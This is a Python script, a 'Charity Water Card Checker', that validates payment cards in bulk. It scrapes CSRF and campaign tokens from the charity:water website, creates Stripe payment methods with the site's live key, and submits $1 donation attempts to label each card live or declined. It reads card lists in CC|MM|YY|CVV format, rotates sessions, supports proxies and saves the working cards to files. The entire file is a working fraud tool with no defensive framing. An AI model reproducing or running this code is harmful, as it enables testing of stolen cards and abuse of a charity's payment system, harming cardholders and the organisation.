import requests
import re
import json
import time
import os
from datetime import datetime
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def create_new_session(proxy=None):
    """Create a new session and grab all necessary tokens and cookies"""
    session = requests.Session()
    
    if proxy:
        session.proxies = {
            "http": proxy,
            "https": proxy
        }
    
    # Initial headers for the first request
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "sec-ch-ua": '"Not(A:Brand";v="99", "Android WebView";v="133", "Chromium";v="133""',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }
    
    # Get the main page to obtain CSRF token and campaign ID
    url = "https://www.charitywater.org/"
    response = session.get(url, headers=headers)
    
    # Extract CSRF token
    csrf_match = re.search(r'<meta name="csrf-token" content="(.*?)"', response.text)
    csrf_token = csrf_match.group(1) if csrf_match else None
    
    # Extract Campaign ID - UUID format
    campaign_match = re.search(r';generalDonateCampaignId&quot;:&quot;([a-zA-Z0-9-]+)&quot;', response.text)
    campaign_id = campaign_match.group(1) if campaign_match else None
    
    if not csrf_token or not campaign_id:
        print(Fore.RED + "Failed to extract required tokens. Retrying...")
        time.sleep(2)
        return create_new_session(proxy)
    
    print(Fore.GREEN + f"Session created successfully!")
    return session, csrf_token, campaign_id

def check_card(session, csrf_token, campaign_id, cc, mm, yy, cvv, email="test@example.com"):
    """Check a single card and return the response"""
    print(Fore.YELLOW + "\n[1/2] Getting Stripe payment method ID...")
    
    # First get a Stripe payment method ID
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "Host": "api.stripe.com",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
        "accept": "application/json",
        "sec-ch-ua": "\"Not(A:Brand\";v=\"99\", \"Android WebView\";v=\"133\", \"Chromium\";v=\"133\"",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
    }
    
    data = {
        "type": "card",
        "billing_details[address][postal_code]": "10006",
        "billing_details[address][city]": "New york",
        "billing_details[address][country]": "US",
        "billing_details[address][line1]": "19A loda lassan",
        "billing_details[email]": email,
        "billing_details[name]": "Vip Op",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "guid": "NA",
        "muid": "NA",
        "sid": "NA",
        "payment_user_agent": "stripe.js/a8247d96cc; stripe-js-v3/a8247d96cc; card-element",
        "referrer": "https://www.charitywater.org",
        "key": "pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"
    }
    
    response = requests.post(url, headers=headers, data=data)
    
    try:
        pm_response = response.json()
        if 'id' not in pm_response:
            print(Fore.RED + "Failed to create payment method")
            return {"status": "error", "message": "Failed to create payment method"}
        
        payment_id = pm_response['id']
        print(Fore.GREEN + f"\nPayment method created: {payment_id}")
        
        # Now check the card with charity water
        print(Fore.YELLOW + "\n[2/2] Checking card with Charity Water...")
        donation_url = "https://www.charitywater.org/donate/stripe"
        
        headers = {
            "Host": "www.charitywater.org",
            "x-csrf-token": csrf_token,
            "sec-ch-ua": "\"Not(A:Brand\";v=\"99\", \"Android WebView\";v=\"133\", \"Chromium\";v=\"133\"",
            "sec-ch-ua-mobile": "?1",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 13; 22011119TI Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.121 Mobile Safari/537.36",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.charitywater.org",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.charitywater.org/",
            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
        }
        
        data = {
            "country": "us",
            "payment_intent[email]": email,
            "payment_intent[amount]": "1",
            "payment_intent[currency]": "usd",
            "payment_intent[payment_method]": payment_id,
            "disable_existing_subscription_check": "false",
            "donation_form[amount]": "1",
            "donation_form[comment]": "",
            "donation_form[display_name]": "",
            "donation_form[email]": email,
            "donation_form[name]": "Vip",
            "donation_form[payment_gateway_token]": "",
            "donation_form[payment_monthly_subscription]": "false",
            "donation_form[surname]": "Op",
            "donation_form[campaign_id]": campaign_id,
        }
        
        donation_response = session.post(donation_url, headers=headers, data=data)
        
        try:
            donation_json = donation_response.json()
            card_status = "Unknown"
            message = ""
            
            if donation_response.status_code == 200:
                if donation_json.get('status') == 'requires_capture':
                    card_status = "LIVE ✅"
                    message = "Card approved"
                elif "id" in donation_json and "client_secret" in donation_json:
                    card_status = "LIVE ✅"
                    message = "Payment authorized"
                else:
                    card_status = "DECLINED ❌"
                    message = f"Payment not approved: {donation_json.get('status', 'unknown status')}"
            else:
                error = donation_json.get('error', {})
                decline_code = error.get('decline_code', 'unknown')
                message = error.get('message', 'Unknown error')
                card_status = f"DECLINED ❌ ({decline_code})"
            
            print(Fore.YELLOW + "\nResult Summary:")
            print(Fore.GREEN if "LIVE" in card_status else Fore.RED + f"{card_status}: {message}")
            
            return {
                "card": f"{cc}|{mm}|{yy}|{cvv}",
                "status": card_status,
                "message": message
            }
            
        except json.JSONDecodeError:
            print(Fore.RED + "Invalid JSON response:")
            return {
                "status": "error", 
                "message": f"Invalid response: {donation_response.text[:100]}...",
                "card": f"{cc}|{mm}|{yy}|{cvv}"
            }
        
    except Exception as e:
        print(Fore.RED + f"Error processing card: {str(e)}")
        return {"status": "error", "message": f"Error processing card: {str(e)}"}

def check_cards_from_file(file_path, proxy=None):
    """Process cards from a text file"""
    
    # Create results directory if it doesn't exist
    results_dir = "results"
    if not os.path.exists(results_dir):
        os.makedirs(results_dir)
    
    # Prepare result files
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    result_file = os.path.join(results_dir, f"results_{timestamp}.txt")
    detailed_results = os.path.join(results_dir, f"detailed_results_{timestamp}.json")
    
    # Check if file exists
    if not os.path.exists(file_path):
        print(Fore.RED + f"Error: File {file_path} does not exist.")
        return
    
    # Read cards from file
    try:
        with open(file_path, 'r') as f:
            cards = f.read().splitlines()
    except Exception as e:
        print(Fore.RED + f"Error reading file: {str(e)}")
        return
    
    total_cards = len(cards)
    print(Fore.YELLOW + f"Loaded {total_cards} cards from {file_path}")
    
    # Create a new session
    session, csrf_token, campaign_id = create_new_session(proxy)
    
    # Track statistics
    live_cards = 0
    declined_cards = 0
    error_cards = 0
    
    # Process each card
    results = []
    for i, card_line in enumerate(cards):
        try:
            # Skip empty lines
            if not card_line.strip():
                continue
                
            # Parse card data
            card_parts = card_line.strip().split('|')
            
            if len(card_parts) < 4:
                print(Fore.RED + f"Invalid card format: {card_line}")
                continue
                
            cc = card_parts[0]
            mm = card_parts[1]
            yy = card_parts[2]
            cvv = card_parts[3]
            email = card_parts[4] if len(card_parts) > 4 else f"test{i}@example.com"
            
            print(Fore.YELLOW + f"\n[{i+1}/{total_cards}] Checking card: {cc[:6]}xxxxxx{cc[-4:]}")
            
            # Check card
            result = check_card(session, csrf_token, campaign_id, cc, mm, yy, cvv, email)
            
            card_status = result.get("status", "Unknown")
            message = result.get("message", "")
            
            if "LIVE" in card_status:
                live_cards += 1
            elif "DECLINED" in card_status:
                declined_cards += 1
            else:
                error_cards += 1
            
            with open(result_file, 'a') as f:
                f.write(f"{card_line} => {card_status}: {message}\n")
            
            results.append({
                "card": card_line,
                "status": card_status,
                "message": message
            })
            
            if (i + 1) % 10 == 0 and i < total_cards - 1:
                print(Fore.YELLOW + "\nCreating a new session...")
                session, csrf_token, campaign_id = create_new_session(proxy)
                
            time.sleep(2)
            
        except Exception as e:
            print(Fore.RED + f"Error processing card {card_line}: {str(e)}")
            error_cards += 1
            
    with open(detailed_results, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(Fore.GREEN + f"\n✅ Processing completed!")
    print(Fore.CYAN + f"Summary:")
    print(Fore.GREEN + f"  Live cards: {live_cards}")
    print(Fore.RED + f"  Declined cards: {declined_cards}")
    print(Fore.YELLOW + f"  Error cards: {error_cards}")
    print(Fore.CYAN + f"  Total processed: {live_cards + declined_cards + error_cards}")
    print(Fore.CYAN + f"\nResults saved to: {result_file}")
    print(Fore.CYAN + f"Detailed results saved to: {detailed_results}")

def main():
    """Main function to run the script"""
    print("=======================================")
    print("    Charity Water Card Checker v1.0    ")
    print("=======================================")
    print()
    
    proxy = None
    use_proxy = input("Do you want to use a proxy? (y/n): ").lower()
    if use_proxy == 'y':
        proxy_host = input("Enter proxy host (e.g., 127.0.0.1): ")
        proxy_port = input("Enter proxy port (e.g., 8080): ")
        proxy_user = input("Enter proxy username (if any): ")
        proxy_pass = input("Enter proxy password (if any): ")
        
        if proxy_user and proxy_pass:
            proxy = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        else:
            proxy = f"http://{proxy_host}:{proxy_port}"
    
    while True:
        print("\nOptions:")
        print("1. Check a single card")
        print("2. Check cards from file")
        print("3. Exit")
        
        choice = input("\nEnter your choice (1-3): ")
        
        if choice == "1":
            cc = input("Enter card number: ")
            mm = input("Enter expiration month (MM): ")
            yy = input("Enter expiration year (YY): ")
            cvv = input("Enter CVV: ")
            email = input("Enter email (or press enter for default): ")
            
            if not email:
                email = "test@example.com"
            
            print("\nChecking card...")
            session, csrf_token, campaign_id = create_new_session(proxy)
            result = check_card(session, csrf_token, campaign_id, cc, mm, yy, cvv, email)
            
            print("\nResult:")
            print(json.dumps(result, indent=2))
            
        elif choice == "2":
            file_path = input("Enter path to cards file (format: CC|MM|YY|CVV): ")
            check_cards_from_file(file_path, proxy)
            
        elif choice == "3":
            print("Exiting...")
            break
            
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()